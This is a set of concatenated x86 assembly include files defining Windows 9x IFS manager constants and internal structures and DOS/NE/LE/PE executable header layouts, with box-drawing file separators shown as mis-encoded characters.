IR_TUNA_IFSTUNNEL       equ     1       ; FSD requests IFSMGR tunneling support


;* Values for IFSMgr_PNPVolumeEvent
PNPE_SUCCESS            equ     000h
PNPE_QUERY_ACCEPTED     equ     000h
PNPE_QUERY_REFUSED      equ     001h
PNPE_BAD_ARGS           equ     002h
PNPE_UNDEFINED          equ     0FFh


;* Type values for IFSMgr_PNPEvent
PNPT_VOLUME     equ     010000000h
PNPT_NET        equ     020000000h
PNPT_MASK       equ     0F0000000h


;* Values for ir_options returned from QueryResource:
RESSTAT_OK      equ     0               ; connection to resource is valid
RESSTAT_PAUSED  equ     1               ; paused by workstation
RESSTAT_DISCONN equ     2               ; disconnected
RESSTAT_ERROR   equ     3               ; cannot be reconnected
RESSTAT_CONN    equ     4               ; first connection in progress
RESSTAT_RECONN  equ     5               ; reconnection in progress


;* Values for ir_flags to HM_CLOSE:
CLOSE_HANDLE    equ     0               ; only closing a handle
CLOSE_FOR_PROCESS equ   1               ; last close of SFN for this process
CLOSE_FINAL     equ     2               ; final close of SFN for system


;* Values for ir_options to HM_CLOSE, HM_COMMIT, hf_read, hf_write:
FILE_NO_LAST_ACCESS_DATE equ    001h    ; do not update last access date
FILE_CLOSE_FOR_LEVEL4_LOCK equ  002h    ; special close on a level 4 lock
FILE_COMMIT_ASYNC       equ     004h    ; commit async instead of sync
FILE_FIND_RESTART       equ     040h    ; set for findnext w/key
IOOPT_PRT_SPEC          equ     080h    ; ir_options flag for int17 writes


;*      Values for ir_flags to VFN_DIR:
CREATE_DIR      equ     0
DELETE_DIR      equ     1
CHECK_DIR       equ     2
QUERY83_DIR     equ     3
QUERYLONG_DIR   equ     4


;*      ir_flags values for HM_FILELOCKS:
LOCK_REGION     equ     0                       ; lock specified file region
UNLOCK_REGION   equ     1                       ; unlock region

; Note: these values are also used by the sharing services
;* ir_options values for HM_FILELOCKS:
LOCKF_MASK_RDWR         equ     001h    ; Read / write lock flag
LOCKF_WR                equ     000h    ; bit 0 clear - write lock
LOCKF_RD                equ     001h    ; bit 0 set - read lock(NW only)
LOCKF_MASK_DOS_NW       equ     002h    ; DOS/Netware style lock flag
LOCKF_DOS               equ     000h    ; bit 1 clear - DOS-style lock
LOCKF_NW                equ     002h    ; bit 1 set - Netware-style lock

;* These values are used internally by the IFS manager only:
LOCKF_MASK_INACTIVE     equ     080h    ; lock active/inactive flag
LOCKF_ACTIVE            equ     000h    ; bit 7 clear - lock active
LOCKF_INACTIVE          equ     080h    ; bit 7 set - lock inactive


;* Values for ir_flags to VFN_PIPEREQUEST and HM_PIPEREQUEST:
;       (NOTE: these values have been chosen to agree with the opcodes used
;       by the TRANSACTION SMB for the matching operation.)
PIPE_QHandState         equ     021h
PIPE_SetHandState       equ     001h
PIPE_QInfo              equ     022h
PIPE_Peek               equ     023h
PIPE_RawRead            equ     011h
PIPE_RawWrite           equ     031h
PIPE_Wait               equ     053h
PIPE_Call               equ     054h
PIPE_Transact           equ     026h


;* Values for ir_flags for HM_HANDLEINFO call:
HINFO_GET               equ     0       ; retrieve current buffering info
HINFO_SETALL            equ     1       ; set info (all parms)
HINFO_SETCHARTIME       equ     2       ; set handle buffer timeout
HINFO_SETCHARCOUNT      equ     3       ; set handle max buffer count


;* Values for ir_flags for HM_ENUMHANDLE call:
ENUMH_GETFILEINFO       equ     0       ; get fileinfo by handle
ENUMH_GETFILENAME       equ     1       ; get filename associated with handle
ENUMH_GETFINDINFO       equ     2       ; get info for resuming
ENUMH_RESUMEFIND        equ     3       ; resume find operation
ENUMH_RESYNCFILEDIR     equ     4       ; resync dir entry info for file


;* Values for ir_options for the ENUMH_RESYNCFILEDIR call:
RESYNC_INVALIDATEMETACACHE      equ     001h    ; invalidate meta cache on resync


;* Values for ir_flags for VFN_FILEATTRIB:
;*
;*      Note: All functions that modify the volume MUST be odd.
;*       Callers rely on this & test the low order bit.
GET_ATTRIBUTES                  equ     0 ; get attributes of file/dir
SET_ATTRIBUTES                  equ     1 ; set attributes of file/dir
GET_ATTRIB_COMP_FILESIZE        equ     2 ; get compressed size of file
SET_ATTRIB_MODIFY_DATETIME      equ     3 ; set date last written of file/dir
GET_ATTRIB_MODIFY_DATETIME      equ     4 ; get date last written of file/dir
SET_ATTRIB_LAST_ACCESS_DATETIME equ     5 ; set date last accessed of file/dir
GET_ATTRIB_LAST_ACCESS_DATETIME equ     6 ; get date last accessed of file/dir
SET_ATTRIB_CREATION_DATETIME    equ     7 ; set create date of file/dir
GET_ATTRIB_CREATION_DATETIME    equ     8 ; get create date of file/dir
GET_ATTRIB_FIRST_CLUST          equ     9 ; get first cluster of a file


;* Values for ir_flags for VFN_FLUSH:
GDF_NORMAL      equ     000h    ; walk disk, if needed, to get free space
GDF_NO_DISK_HIT equ     001h    ; return current "hint", don't walk disk


;* Values for ir_flags for HM_FILETIMES:
GET_MODIFY_DATETIME     equ     0       ; get last modification date/time
SET_MODIFY_DATETIME     equ     1       ; set last modification date/time
GET_LAST_ACCESS_DATETIME equ    4       ; get last access date/time
SET_LAST_ACCESS_DATETIME equ    5       ; set last access date/time
GET_CREATION_DATETIME   equ     6       ; get creation date/time
SET_CREATION_DATETIME   equ     7       ; set creation date/time


;* Values for ir_flags for HM_SEEK:
FILE_BEGIN      equ     0               ; absolute posn from file beginning
FILE_END        equ     2               ; signed posn from file end


;* Values for ir_flags for VFN_OPEN:
ACCESS_MODE_MASK        equ     00007h  ; Mask for access mode bits
ACCESS_READONLY         equ     00000h  ; open for read-only access
ACCESS_WRITEONLY        equ     00001h  ; open for write-only access
ACCESS_READWRITE        equ     00002h  ; open for read and write access
ACCESS_EXECUTE          equ     00003h  ; open for execute access
SHARE_MODE_MASK         equ     00070h  ; Mask for share mode bits
SHARE_COMPATIBILITY     equ     00000h  ; open in compatability mode
SHARE_DENYREADWRITE     equ     00010h  ; open for exclusive access
SHARE_DENYWRITE         equ     00020h  ; open allowing read-only access
SHARE_DENYREAD          equ     00030h  ; open allowing write-only access
SHARE_DENYNONE          equ     00040h  ; open allowing other processes access
SHARE_FCB               equ     00070h  ; FCB mode open


;* Values for ir_options for VFN_OPEN:
ACTION_MASK             equ     0ffh    ; Open Actions Mask
ACTION_OPENEXISTING     equ     001h    ; open an existing file
ACTION_REPLACEEXISTING  equ     002h    ; open existing file and set length
ACTION_CREATENEW        equ     010h    ; create a new file, fail if exists
ACTION_OPENALWAYS       equ     011h    ; open file, create if does not exist
ACTION_CREATEALWAYS     equ     012h    ; create a new file, even if it exists

;* Alternate method: bit assignments for the above values:
ACTION_EXISTS_OPEN      equ     001h    ; BIT: If file exists, open file
ACTION_TRUNCATE         equ     002h    ; BIT: Truncate file
ACTION_NEXISTS_CREATE   equ     010h    ; BIT: If file does not exist, create

; these mode flags are passed in via ifs_options to VFN_OPEN
OPEN_FLAGS_NOINHERIT    equ     00080h
OPEN_FLAGS_NO_CACHE     equ     R0_NO_CACHE ; 0x0100
OPEN_FLAGS_NO_COMPRESS  equ     00200h
OPEN_FLAGS_ALIAS_HINT   equ     00400h
OPEN_FLAGS_NOCRITERR    equ     02000h
OPEN_FLAGS_COMMIT       equ     04000h
OPEN_FLAGS_REOPEN       equ     00800h  ; file is being reopened on vol lock

;* Values returned by VFN_OPEN for action taken:
ACTION_OPENED           equ     1       ; existing file has been opened
ACTION_CREATED          equ     2       ; new file has been created
ACTION_REPLACED         equ     3       ; existing file has been replaced


;* Values for ir_flags for VFN_SEARCH:
SEARCH_FIRST            equ     0       ; findfirst operation
SEARCH_NEXT             equ     1       ; findnext operation


;* Values for ir_flags for VFN_DISCONNECT:
DISCONNECT_NORMAL       equ     0       ; normal disconnect
DISCONNECT_NO_IO        equ     1       ; no i/o can happen at this time
DISCONNECT_SINGLE       equ     2       ; disconnect this drive only


;* Values for ir_options for VFN_FLUSH:
VOL_DISCARD_CACHE       equ     1
VOL_REMOUNT             equ     2


;* Values for ir_options for VFN_IOCTL16DRIVE:
IOCTL_PKT_V86_ADDRESS   equ     0       ; V86 pkt address in user DS:DX
IOCTL_PKT_LINEAR_ADDRESS equ    1       ; Linear address to packet in ir_data


;* Values for ir_flags for VFN_DASDIO:
DIO_ABS_READ_SECTORS    equ     0       ; Absolute disk read
DIO_ABS_WRITE_SECTORS   equ     1       ; Absolute disk write
DIO_SET_LOCK_CACHE_STATE equ    2       ; Set cache state during volume lock


;*      Values for ir_options for DIO_SET_LOCK_CACHE_STATE:
DLC_LEVEL4LOCK_TAKEN    equ     001h    ; cache writethru, discard name cache
DLC_LEVEL4LOCK_RELEASED equ     002h    ; revert to normal cache state
DLC_LEVEL1LOCK_TAKEN    equ     004h    ; cache writethru, discard name cache
DLC_LEVEL1LOCK_RELEASED equ     008h    ; revert to normal cache state


; These values for ir_options are used only on ring 0 apis
R0_NO_CACHE             equ     00100h  ; must not cache reads/writes
R0_SWAPPER_CALL         equ     01000h  ; called by the swapper
R0_MM_READ_WRITE        equ     08000h  ; indicates this is a MMF R0 i/o
R0_SPLOPT_MASK          equ     0FF00h  ; mask for ring 0 special options


;* Values for ir_attr for different file attributes:
FILE_ATTRIBUTE_READONLY         equ     001h    ; read-only file
FILE_ATTRIBUTE_HIDDEN           equ     002h    ; hidden file
FILE_ATTRIBUTE_SYSTEM           equ     004h    ; system file
FILE_ATTRIBUTE_LABEL            equ     008h    ; volume label
FILE_ATTRIBUTE_DIRECTORY        equ     010h    ; subdirectory
FILE_ATTRIBUTE_ARCHIVE          equ     020h    ; archived file/directory
FILE_ATTRIBUTE_DEVICE           equ     040h    ; device

; The second byte of ir_attr is a mask of attributes which "must match"
; on a SEARCH or FINDOPEN call.  If an attribute bit is set in the
; "must match" mask, then the file must also have that attribute set
; to match the search/find.
FILE_ATTRIBUTE_MUSTMATCH        equ     000003F00h      ; 00ADVSHR Must Match
FILE_ATTRIBUTE_EVERYTHING       equ     00000003Fh      ; 00ADVSHR Find Everything
FILE_ATTRIBUTE_INTERESTING      equ     00000001Eh      ; 000DVSH0 Search bits


;   Auto-generation flags returned from CreateBasis()
BASIS_TRUNC             equ     001h    ; original name was truncated
BASIS_LOSS              equ     002h    ; char translation loss occurred
BASIS_UPCASE            equ     004h    ; char in basis was upcased
BASIS_EXT               equ     020h    ; char in basis is extended ASCII

;   Flags that SHOULD associated with detecting 'collisions' in the basis name
;   and the numeric tail of a basis name.  They are defined here so that routines
;   who need to flag these conditions use these values in a way that does not
;   conflict with the previous three 'basis' flags.
BASIS_NAME_COLL         equ     008h    ; collision in the basis name component
BASIS_NUM_TAIL_COLL     equ     010h    ; collision in the numeric-tail component


;       Flags returned by long-name FindOpen/Findnext calls.  The flags
;       indicate whether a mapping from UNICODE to BCS of the primary and
;       altername names in the find buffer have lost information.  This
;       occurs whenever a UNICODE char cannot be mapped into an OEM/ANSI
;       char in the codepage specified.
FIND_FLAG_PRI_NAME_LOSS                 equ     00001h
FIND_FLAG_ALT_NAME_LOSS                 equ     00002h


;       Flags returned by UNIToBCS, BCSToUni, UniToBCSPath, MapUniToBCS
;  MapBCSToUni.  The flags indicate whether a mapping from UNICODE
;  to BCS, or BCS to UNICODE have lost information.  This occurs
;       whenever a char cannot be mapped.
MAP_FLAG_LOSS                                   equ     00001h
MAP_FLAG_TRUNCATE                               equ     00002h


; These bits are also set in ir_attr for specific properties of the
; pathname/filename.
;
; A filename is 8.3 compatible if it contains at most 8 characters before
; a DOT or the end of the name, at most 3 chars after a DOT, at most one
; DOT, and no new LFN only characters.  The new LFN characters are:
; , + = [ ] ;
;
; If a name does not meet all of the 8.3 rules above then it is considered
; to be a "long file name", LFN.
FILE_FLAG_WILDCARDS     equ     080000000h      ; set if wildcards in name
FILE_FLAG_HAS_STAR      equ     040000000h      ; set if *'s in name (PARSE_WILD also set)
FILE_FLAG_LONG_PATH     equ     020000000h      ; set if any path element is not 8.3
FILE_FLAG_KEEP_CASE     equ     010000000h      ; set if FSD should use ir_uFName
FILE_FLAG_HAS_DOT       equ     008000000h      ; set if last path element contains .'s
FILE_FLAG_IS_LFN        equ     004000000h      ; set if last element is LFN


; Function definitions on the ring 0 apis function list:
; NOTE: Most functions are context independent unless explicitly stated
; i.e. they do not use the current thread context. R0_LOCKFILE is the only
; exception - it always uses the current thread context.
R0_OPENCREATFILE        equ     0D500h  ; Open/Create a file
R0_OPENCREAT_IN_CONTEXT equ     0D501h  ; Open/Create file in current context
R0_READFILE             equ     0D600h  ; Read a file, no context
R0_WRITEFILE            equ     0D601h  ; Write to a file, no context
R0_READFILE_IN_CONTEXT  equ     0D602h  ; Read a file, in thread context
R0_WRITEFILE_IN_CONTEXT equ     0D603h  ; Write to a file, in thread context
R0_CLOSEFILE            equ     0D700h  ; Close a file
R0_GETFILESIZE          equ     0D800h  ; Get size of a file
R0_FINDFIRSTFILE        equ     04E00h  ; Do a LFN FindFirst operation
R0_FINDNEXTFILE         equ     04F00h  ; Do a LFN FindNext operation
R0_FINDCLOSEFILE        equ     0DC00h  ; Do a LFN FindClose operation
R0_FILEATTRIBUTES       equ     04300h  ; Get/Set Attributes of a file
R0_RENAMEFILE           equ     05600h  ; Rename a file
R0_DELETEFILE           equ     04100h  ; Delete a file
R0_LOCKFILE             equ     05C00h  ; Lock/Unlock a region in a file
R0_GETDISKFREESPACE     equ     03600h  ; Get disk free space
R0_READABSOLUTEDISK     equ     0DD00h  ; Absolute disk read
R0_WRITEABSOLUTEDISK    equ     0DE00h  ; Absolute disk write


; Special definitions for ring 0 apis for drive information flags
IFS_DRV_RMM             equ     00001h  ; drive is managed by RMM
IFS_DRV_DOS_DISK_INFO   equ     00002h  ; drive needs DOS


;* search - Search record structure
;
; This strucure defines the result buffer format for search returns
; for int21h based file searches: 11H/12H FCB Find First/Next
;       and 4eH/4fH path based Find First/Next
;
; There are two areas in the search_record reserved for use by file system
; drivers. One is to be used by local file systems such as FAT or CDROM
; and the other is to be used by network file systems such as an SMB or
; NCP client. The reason for the split is because many network file
; systems send and receive the search key directly on the net.

;typedef struct srch_key srch_key;
srch_key        struc
  sk_drive      db      ?               ; Drive specifier (set by IFS MGR)
  sk_pattern    db      11 dup (?)      ; Reserved (pattern sought)
  sk_attr       db      ?               ; Reserved (attribute sought)
  sk_localFSD   db      4 dup (?)       ; available for use local FSDs
  sk_netFSD     db      2 dup (?)       ; available for use by network FSDs
  sk_ifsmgr     db      2 dup (?)       ; reserved for use by IFS MGR
srch_key        ends

;typedef struct srch_entry srch_entry;
srch_entry      struc
  se_key        db      (size srch_key) dup (?) ; resume key
  se_attrib     db      ?               ; file attribute
  se_time       dw      ?               ; time of last modification to file
  se_date       dw      ?               ; date of last modification to file
  se_size       dd      ?               ; size of file
  se_name       db      13 dup (?)      ; ASCIIZ name with dot included
srch_entry      ends


;* Win32 Date Time structure
; This structure defines the new Win32 format structure for returning the
; date and time
;typedef struct _FILETIME _FILETIME;
_FILETIME       struc
  dwLowDateTime dd      ?
  dwHighDateTime dd     ?
_FILETIME       ends


;* Win32 Find Structure
;  This structure defines the contents of the result buffer on a
; Win32 FindFirst / FindNext. These calls are accessed by the new
; LFN find apis
;typedef struct _WIN32_FIND_DATA _WIN32_FIND_DATA;
_WIN32_FIND_DATA        struc
  dwFileAttributes      dd      ?
  ftCreationTime        db      (size _FILETIME) dup (?)
  ftLastAccessTime      db      (size _FILETIME) dup (?)
  ftLastWriteTime       db      (size _FILETIME) dup (?)
  nFileSizeHigh         dd      ?
  nFileSizeLow          dd      ?
  dwReserved0           dd      ?
  dwReserved1           dd      ?
  cFileName             dw      MAX_PATH dup (?)        ; includes NUL
  cAlternateFileName    dw      14 dup (?)              ; includes NUL
_WIN32_FIND_DATA        ends


;* Win32 File Info By Handle Structure
;  This structure defines the contents of the result buffer on a
;  Win32 FileInfoByHandle. These calls are accessed by the new
;  LFN find apis
;typedef struct _BY_HANDLE_FILE_INFORMATION _BY_HANDLE_FILE_INFORMATION;
_BY_HANDLE_FILE_INFORMATION     struc   ; bhfi
  bhfi_dwFileAttributes         dd      ?
  bhfi_ftCreationTime           db      (size _FILETIME) dup (?)
  bhfi_ftLastAccessTime         db      (size _FILETIME) dup (?)
  bhfi_ftLastWriteTime          db      (size _FILETIME) dup (?)
  bhfi_dwVolumeSerialNumber     dd      ?
  bhfi_nFileSizeHigh            dd      ?
  bhfi_nFileSizeLow             dd      ?
  bhfi_nNumberOfLinks           dd      ?
  bhfi_nFileIndexHigh           dd      ?
  bhfi_nFileIndexLow            dd      ?
_BY_HANDLE_FILE_INFORMATION     ends


; these are win32 defined flags for GetVolInfo
FS_CASE_IS_PRESERVED            equ     000000002h
FS_UNICODE_STORED_ON_DISK       equ     000000004h

; these flags for GetVolInfo are NOT defined
FS_VOL_IS_COMPRESSED            equ     000008000h
FS_VOL_SUPPORTS_LONG_NAMES      equ     000004000h


; these flags are returned by IFSMgr_Get_Drive_Info
FDRV_INT13              equ     001h
FDRV_FASTDISK           equ     002h
FDRV_COMP               equ     004h
FDRV_RMM                equ     008h
FDRV_DOS                equ     010h
FDRV_USE_RMM            equ     020h
FDRV_COMPHOST           equ     040h
FDRV_NO_LAZY            equ     080h


;* TUNINFO - Tunneling Information
;       This structure defines the information passed into the FSD on
;       a Create or Rename operation if tunneling was detected.  This
;       gives a set of advisory information to create the new file with.
;       if ir_ptuninfo is NULL on Create or Rename, none of this information
;       is available.  All of this information is advisory.  tuni_bfContents
;       defines what pieces of tunneling information are available.
;typedef struct TUNINFO         TUNINFO;
TUNINFO         struc
  tuni_bfContents       dd      ?
  % tuni_pAltName       $P      ?
  tuni_ftCreationTime   db      (size _FILETIME) dup (?)
  tuni_ftLastAccessTime db      (size _FILETIME) dup (?)
  tuni_ftLastWriteTime  db      (size _FILETIME) dup (?)
TUNINFO ends

TUNI_CONTAINS_ALTNAME   equ     000000001h      ; pAltName available
TUNI_CONTAINS_CREATIONT equ     000000002h      ; ftCreationTime available
TUNI_CONTAINS_LASTACCESST equ   000000004h      ; ftLastAccessTime available
TUNI_CONTAINS_LASTWRITET equ    000000008h      ; ftLastWriteTime available


;* _QWORD - 64-bit data type
;  A struct used to return 64-bit data types to C callers
;  from the qwUniToBCS & qwUniToBCS rotuines.  These
;  'routines' are just alias' for UntoToBCS & UniToBCSPath
;  routines and do not exist as separate entities.  Both
;  routines always return a 64-bit result.  The lower
;  32-bits are a length.  The upper 32-bits are flags.
;  Typically, the flag returned indicates whether a mapping
;  resulted in a loss on information in the UNICODE to BCS
;  translation (i.e. a unicode char was converted to an '_').
;typedef struct _QWORD _QWORD;
_QWORD  struc
  ddLower       dd      ?
  ddUpper       dd      ?
_QWORD  ends


;* ParsedPath - structure of an IFSMgr parsed pathname
PathElement     struc
  pe_length     dw      ?
  pe_unichars   dw      1 dup (?)
PathElement     ends

ParsedPath      struc
  pp_totalLength dw     ?
  pp_prefixLength dw    ?
  pp_elements   db      (1*size PathElement) dup (?)
ParsedPath      ends


; Values for charSet passed to character conversion routines
BCS_WANSI       equ     0       ; use Windows ANSI set
BCS_OEM         equ     1       ; use current OEM character set
BCS_UNI         equ     2       ; use UNICODE character set


;   Matching semantics flags passed to MetaMatchUni()
UFLG_META       equ     001h
UFLG_NT         equ     002h
UFLG_NT_DOS     equ     004h
UFLG_DOS        equ     000h


; define the utb and btu ptr table structures
;typedef struct CPPtrs CPPtrs;
CPPtrs  struc
  AnsiPtr       dd      ?
  OEMPtr        dd      ?
CPPtrs  ends

;typedef struct UnitoUpperTab UnitoUpperTab;
UnitoUpperTab   struc
  delta         dd      ?
  TabPtr        dd      ?
UnitoUpperTab   ends

;typedef struct CPTablePtrs CPTablePtrs;
CPTablePtrs     struc
  CPT_Length    dd      ?
  utbPtrTab     db      (size CPPtrs) dup (?)
  btuPtrTab     db      (size CPPtrs) dup (?)
  UnitoUpperPtr db      (size UnitoUpperTab) dup (?)
CPTablePtrs     ends


fmode_t         struc           ; File mode information
  fm_uid        dd      ?       ; User ID
  % fm_cookie0  $P      ?       ; Caller-supplied cookie
  % fm_cookie1  $P      ?       ; Caller-supplied cookie
  fm_mode       dw      ?       ; File sharing mode and access
  fm_attr       dw      ?       ; File attributes
fmode_t ends


; These flags are used on the Win32 service to duplicate an extended handle
DUP_NORMAL_HANDLE       equ     000h    ; dup handle for normal file io
DUP_MEMORY_MAPPED       equ     001h    ; dup handle for memory-mapping
DUP_MEM_MAPPED_WRITE    equ     002h    ; mem mapping is for write if set,
                                        ; is for read if clear.


; These constants for the different subfunctions on NameTrans (7160h)
NAMTRN_NORMALQUERY      equ     000h    ; normal LFN NameTrans operation
NAMTRN_DO83QUERY        equ     001h    ; NameTrans to return full 8.3 name
NAMTRN_DOLFNQUERY       equ     002h    ; NameTrans to return full LFN name


; These constants are used for the different subfunctions on Get List Of
; Open Files (440dh, 086Dh)
ENUM_ALL_FILES          equ     000h    ; enumerate all open files
ENUM_UNMOVEABLE_FILES   equ     001h    ; enumerate only unmoveable files


;* Structure for the open file information from DOS to take over open files.
;typedef struct SFTOpenInfo SFTOpenInfo;
;typedef struct SFTOpenInfo *pSFTOpenInfo;
SFTOpenInfo     struc
  soi_dirclus   dw      ?               ; cluster # for directory
  soi_dirind    dw      ?               ; directory index of dir entry
  soi_dirname   db      11 dup (?)      ; directory entry name
  soi_pad       db      ?               ; pad out for dword boundary
SFTOpenInfo     ends


컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[IFS.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[IFSEXT.INC]컴�

include         vmm.inc
include         ifs.inc


ifsreq  struc
  ifs_ir        ioreq   ?
  ifs_pfh       dd      ?
  ifs_psft      dd      ?
  ifs_psr       dd      ?
  ifs_pdb       dd      ?
  ifs_proid     dd      ?
  ifs_func      db      ?
  ifs_drv       db      ?
  ifs_hflag     db      ?
  ifs_nflags    db      ?
  ifs_pbuffer   dd      ?
  ifs_VMHandle  dd      ?
  ifs_pv        dd      ?
  ifs_crs       CLIENT_STRUCT ?
ifsreq  ends


volinfo struc
  vi_psr        dd      ?
  vi_pszRootDir dd      ?
  vi_Client_CX  dw      ?
  vi_unk1       db      ?
  vi_flags      db      ?
  vi_leng       dw      ?
  vi_unk2       db      ?
  vi_drv        db      ?
  vi_subst_path dd      ?
  vi_CDS_copy   dd      ?
volinfo ends


shres   struc
  sr_sig        dw      ?
  sr_serial     db      ?
  sr_idx        db      ?
  sr_next       dd      ?
  sr_rh         dd      ?
  sr_func       dd      ?
  sr_inUse      dd      ?
  sr_uword      dw      ?
  sr_HndCnt     dw      ?
  sr_UNCCnt     db      ?
  sr_DrvCnt     db      ?
  sr_rtype      db      ?
  sr_flags      db      ?
  sr_ProID      dd      ?
  sr_VolInfo    dd      ?
  sr_fhandleHead dd     ?
  sr_LockPid    dd      ?
  sr_LockSavFunc dd     ?
  sr_LockType   db      ?
  sr_PhysUnit   db      ?
  sr_LockFlags  dw      ?
  sr_LockOwner  dd      ?
  sr_LockWaitCnt dw     ?
  sr_LockReadCnt dw     ?
  sr_LockWriteCnt dw    ?
  sr_flags2     db      ?
  sr_reserved   db      ?
  sr_pnv        dd      ?
shres   ends


hlockinfo       struc
  hl            hndlfunc ?
  hl_lock       dd      ?
  hl_flags      dd      ?
  hl_pathlen    dd      ?
  hl_pathname   dw      ?
hlockinfo       ends


fhandle struc
  fh_hf         hndlfunc ?
  fh_fh         fh_t    ?
  fh_psr        dd      ?
  fh_pSFT       dd      ?
  fh_position   dd      ?
  fh_devflags   dw      ?
  fh_hflag      db      ?
  fh_type       db      ?
  fh_ref_count  dw      ?
  fh_mode       dw      ?
  fh_hlockinfo  dd      ?
  fh_prev       dd      ?
  fh_next       dd      ?
  fh_sfn        dw      ?
  fh_mmsfn      dw      ?
  fh_pid        dd      ?
  fh_ntid       dd      ?
  fh_fhFlags    dw      ?
  fh_InCloseCnt dw      ?
fhandle ends


cds     struc
  cds_root_pathname     db      67 dup(?)
  cds_attrib            dw      ?
  cds_physdrv           db      ?
  cds_flag              db      ?
  cds_cluster_parent_dir dw     ?
  cds_entry_num         dw      ?
  cds_cluster_current_dir dw    ?
  cds_media_change      dw      ?
  cds_ofs_visible_dir   dw      ?
cds     ends

pervm   struc
  pv_next       dd      ?
  pv_prev       dd      ?
  pv_flags      db      ?
  pv_cnt        db      ?
  pv_curdrv     db      ?
  pv_unk2       db      ?
  pv_dispfunc   dd      ?
  pv_pifs       dd      ?
  pv_pev_vm     dd      ?
  pv_Client_DS  dd      ?
  pv_Client_EDX dd      ?
  pv_hev        dd      ?
  pv_pfh        dd      32 dup(?)
  pv_pev_vm2    dd      ?
  pv_ppsft      dd      ?
  pv_curdir     dd      32 dup(?)
  pv_flags2     dw      ?
  pv_unk3       dw      ?
pervm   ends


컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[IFSEXT.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[FileHead.inc]컴�

IMAGE_DOS_SIGNATURE     equ     5A4Dh           ; MZ
IMAGE_OS2_SIGNATURE     equ     454Eh           ; NE
IMAGE_OS2_SIGNATURE_LE  equ     454Ch           ; LE
IMAGE_VXD_SIGNATURE     equ     454Ch           ; LE
IMAGE_NT_SIGNATURE      equ     00004550h       ; PE00


; dos exe header
exe_header      struc
eh_sign         dw      ?       ;   0
eh_sect_mod     dw      ?       ;   2
eh_sects        dw      ?       ;   4
eh_rels         dw      ?       ;   6
eh_header_para  dw      ?       ;   8
eh_min_mem_para dw      ?       ;   A
eh_max_mem_para dw      ?       ;   C
eh_ss           dw      ?       ;   E
eh_sp           dw      ?       ;  10
eh_checksum     dw      ?       ;  12
eh_ip           dw      ?       ;  14
eh_cs           dw      ?       ;  16
eh_1st_rel      dw      ?       ;  18
eh_ovl_num      dw      ?       ;  1A
eh_reserved     dw      4 dup(?) ; 1C
eh_oemid        dw      ?       ;  24
eh_oeminfo      dw      ?       ;  26
eh_reserved2    dw      10 dup(?) ;28
eh_neh_ofs      dd      ?       ;  3C
exe_header      ends


; Win16 new exe header
new_exe_header  struc
neh_sign        dw      ?
neh_linker_ver  dw      ?
neh_entry_tb_ofs dw     ?
neh_entry_tb_size dw    ?
neh_crc         dd      ?
neh_prog_flags  db      ?
neh_app_flags   db      ?
neh_auto_data_seg_index dw ?
neh_init_loc_heap_size dw ?
neh_init_stack_size dw  ?
neh_ip          dw      ?
neh_cs          dw      ?
neh_sp          dw      ?
neh_ss          dw      ?
neh_seg_count   dw      ?
neh_mod_ref_count dw    ?
neh_nresid_name_size dw ?
neh_seg_tb_ofs  dw      ?
neh_resrc_tb_ofs dw     ?
neh_resid_name_tb_ofs dw ?
neh_mod_ref_ofs dw      ?
neh_import_name_tb_ofs dw ?
neh_nresid_name_tb_ofs dd ?
neh_movable_entry_count dw ?
neh_align_shift dw      ?
neh_resrc_tb_entry_count dw ?
neh_opert_system db     ?
neg_exe_flags   db      ?
neg_ret_thunk_ofs dw    ?
neh_seg_ref_thunk_ofs dw ?
neh_mini_code_swap_size dw ?
neh_expect_win_ver dw   ?
new_exe_header  ends


; dos device driver header
sys_header      struc
sh_next_ptr     dd      ?
sh_attr         dw      ?
sh_strat        dw      ?
sh_int          dw      ?
sh_name         db      8 dup(?)
sys_header      ends


IMAGE_FILE_HEADER struc
  Machine               dw      ?
  NumberOfSections      dw      ?
  TimeDateStamp         dd      ?
  PointerToSymbloTable  dd      ?
  NumberOfSymbols       dd      ?
  SizeOfOptionalHeader  dw      ?
  Characteristics       dw      ?
IMAGE_FILE_HEADER ends

IMAGE_SIZEOF_FILE_HEADER        equ     20

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h   ; Relocation info stripped from file.
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h   ; File is executable  (i.e. no unresolved externel references).
IMAGE_FILE_LINE_NUMS_STRIPPED   equ     0004h   ; Line nunbers stripped from file.
IMAGE_FILE_LOCAL_SYMS_STRIPPED  equ     0008h   ; Local symbols stripped from file.
IMAGE_FILE_AGGRESIVE_WS_TRIM    equ     0010h   ; Agressively trim working set
IMAGE_FILE_BYTES_REVERSED_LO    equ     0080h   ; Bytes of machine word are reversed.
IMAGE_FILE_32BIT_MACHINE        equ     0100h   ; 32 bit word machine.
IMAGE_FILE_DEBUG_STRIPPED       equ     0200h   ; Debugging info stripped from file in .DBG file
IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP equ  0400h   ; If Image is on removable media, copy and run from the swap file.
IMAGE_FILE_NET_RUN_FROM_SWAP    equ     0800h   ; If Image is on Net, copy and run from the swap file.
IMAGE_FILE_SYSTEM               equ     1000h   ; System File.
IMAGE_FILE_DLL                  equ     2000h   ; File is a DLL.
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h   ; File should only be run on a UP machine
IMAGE_FILE_BYTES_REVERSED_HI    equ     8000h   ; Bytes of machine word are reversed.

IMAGE_FILE_MACHINE_UNKNOWN equ  0
IMAGE_FILE_MACHINE_I386    equ  14Ch    ; Intel 386.
IMAGE_FILE_MACHINE_R3000   equ  162h    ; MIPS little-endian, 0x160 big-endian
IMAGE_FILE_MACHINE_R4000   equ  166h    ; MIPS little-endian
IMAGE_FILE_MACHINE_R10000  equ  168h    ; MIPS little-endian
IMAGE_FILE_MACHINE_ALPHA   equ  184h    ; Alpha_AXP
IMAGE_FILE_MACHINE_POWERPC equ  1F0h    ; IBM PowerPC Little-Endian


IMAGE_DATA_DIRECTORY struc
  iddVirtualAddress     dd      ?
  iddSize               dd      ?
IMAGE_DATA_DIRECTORY ends

IMAGE_NUMBEROF_DIRECTORY_ENTRIES equ    16

